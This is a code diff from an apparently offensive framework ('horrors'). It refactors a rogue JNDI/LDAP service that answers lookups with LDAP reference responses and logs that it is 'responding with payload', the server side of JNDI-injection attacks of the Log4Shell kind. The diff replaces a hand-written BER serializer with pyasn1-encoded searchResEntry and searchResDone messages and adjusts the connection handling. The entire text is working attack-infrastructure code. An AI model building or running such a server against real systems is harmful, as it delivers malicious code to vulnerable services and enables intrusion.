@@ -4,7 +4,9 @@ import importlib
 import string
 
 from bs4 import BeautifulSoup
+from pyasn1.codec.ber.encoder import encode
 
+from LDAP import LDAPMessage
 from horrors import (
     events,
     logging,
@@ -26,37 +28,38 @@ def class_import(path):
     return clss
 
 
-class Serializer:
-
-    def __init__(self):
-        self.payload = bytes()
-        self.size_stack = list()
-
-    def push(self, data):
-        if isinstance(data, str):
-            data = data.encode()
-        self.payload = data + self.payload
-        return self
-
-    def pop_size(self):
-        return self.push(bytes([len(self.payload) - self.size_stack.pop()]))
-
-    def push_size(self, count=1):
-        for _ in range(count):
-            self.size_stack.append(len(self.payload))
-        return self
-
-    def build(self):
-        return self.payload
-
-    def __repr__(self):
-        return f'Serializer {self.payload}'
-
-
 class Template(string.Template):
 
     delimiter = '%%'
 
+
+class LDAP:
+    @classmethod
+    def searchResEntry(cls, query_name, template):
+        record = LDAPMessage()
+        record['messageID'] = 2
+        res = record['protocolOp']['searchResEntry']
+        res['objectName'] = query_name
+        index = 0
+        for key, val in template.items():
+            res['attributes'][index]['type'] = key
+            res['attributes'][index]['vals'][0] = val
+            index += 1
+        response = encode(record)
+        logging.debug('Sending LDAP response: ' + str(response))
+        return response
+
+    @classmethod
+    def searchResDone(cls):
+        record = LDAPMessage()
+        record['messageID'] = 2
+        res = record['protocolOp']['searchResDone']
+        res['resultCode'] = 0
+        res['matchedDN'] = ''
+        res['errorMessage'] = ''
+        response = encode(record)
+        logging.debug('Sending LDAP searchResDone: ' + str(response))
+        return response
 
 class JNDI(services.Service):
 
@@ -93,16 +96,7 @@ class JNDI(services.Service):
         except KeyError:
             # NOTE: Fallback to `RESPONSE_LDAP_REFERENCE` by default if unknown query path
             template = self.RESPONSE_LDAP_REFERENCE
-        serializer = Serializer()
-        serializer.push_size(2)
-        for key, val in template.items():
-            serializer.push_size(3).push(val).pop_size().push(b'\x04').pop_size().push(b'1')
-            serializer.push_size().push(key).pop_size().push(b'\x04').pop_size().push(b'0')
-        serializer.push(b'0\x81\x82').push_size().push(query_name).pop_size().push(b'\x04').pop_size()
-        serializer.push(b'\x02\x01\x02d\x81').pop_size().push(b'0\x81')
-        response = serializer.build() + self.RESPONSE_SUCCESS
-        logging.debug('Sending LDAP response: ' + str(response))
-        return response
+        return LDAP.searchResEntry(query_name, template)
 
     async def handler(self, reader, writer):
         logging.info('{}:{} requested data, responding with payload...'.format(*reader._transport._sock.getpeername()))
@@ -118,8 +112,8 @@ class JNDI(services.Service):
             logging.debug('Responding to query: ' + query_name)
             response = self.serialize(query_name)
             writer.write(response)
-            await asyncio.sleep(0.5)
-            await reader.read(8096)  # NOTE: Acknowledge
+            await writer.drain()
+            writer.write(LDAP.searchResDone())
             await writer.drain()
         writer.write_eof()
         writer.close()
